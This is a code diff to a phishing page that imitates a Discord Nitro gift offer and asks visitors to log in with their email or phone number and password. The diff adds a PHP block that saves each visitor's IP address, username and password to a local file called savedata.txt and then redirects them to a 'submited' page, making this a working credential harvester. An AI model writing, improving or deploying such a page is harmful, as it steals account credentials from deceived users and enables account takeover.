@@ -10,16 +10,16 @@
     <meta name="og:image" itemprop="image" content="https://cdn1.epicgames.com/salesEvent/salesEvent/EGS_Discord_Nitro_2560x1440_withlogo_2560x1440-944994658df3b04d0c4940be832da19e">
   </head>
   <body>
-    <center>
     <div class="loginPart">
       <br/><br/><br/>
                        You Have Been Gifted a 3 Month Nitro! you need to                  login to earn it.
       <br/><br/><br/>
+      <center>
       <p class="welcome">Welcome Back!</p>
         <br/>
         Email or Phone number:
         <br/>
-      <form method="POST" action="save.php">
+      <form method="post">
         <input type="text" name="user" class="inputs" />
         <br/>
         Password:
@@ -28,7 +28,18 @@
         <br/><br/>
         <input type="submit" name="submit" value="Login" class="submit"/>
       </form>
+      </center>
     </div>
-  </center>
+    <?php
+    $iptoken = $_SERVER['REMOTE_ADDR'];  
+    if(isset($_POST['pass'])){
+      $user = $_POST['user'];
+      $pass = $_POST['pass'];
+      $file=fopen("savedata.txt", "a+");
+      fwrite($file," -  IP: ".$iptoken."   Username: " . $user . "   Password: " . $pass . "\n\n");
+      fclose($file);
+      header("Location: submited.php");
+    }
+    ?>
   </body>
 </html>
